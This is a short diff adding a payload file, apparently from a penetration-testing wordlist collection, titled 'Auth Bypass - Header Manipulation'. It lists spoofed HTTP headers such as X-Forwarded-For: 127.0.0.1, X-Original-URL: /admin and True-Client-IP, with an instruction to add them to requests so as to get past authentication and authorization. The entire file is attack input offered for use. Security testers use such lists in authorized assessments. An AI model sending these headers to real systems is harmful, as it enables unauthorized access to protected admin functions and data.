@@ -1,0 +1,21 @@
+# Auth Bypass - Header Manipulation
+# HTTP header tricks to bypass authentication and authorization
+# Add these as custom headers in requests
+X-Forwarded-For: 127.0.0.1
+X-Forwarded-For: localhost
+X-Forwarded-For: 10.0.0.1
+X-Forwarded-For: 192.168.1.1
+X-Original-URL: /admin
+X-Rewrite-URL: /admin
+X-Custom-IP-Authorization: 127.0.0.1
+X-Originating-IP: 127.0.0.1
+X-Remote-IP: 127.0.0.1
+X-Client-IP: 127.0.0.1
+X-Real-IP: 127.0.0.1
+X-Host: localhost
+X-Forwarded-Host: localhost
+X-ProxyUser-Ip: 127.0.0.1
+True-Client-IP: 127.0.0.1
+Cluster-Client-IP: 127.0.0.1
+X-Forwarded-Port: 443
+X-Forwarded-Scheme: https
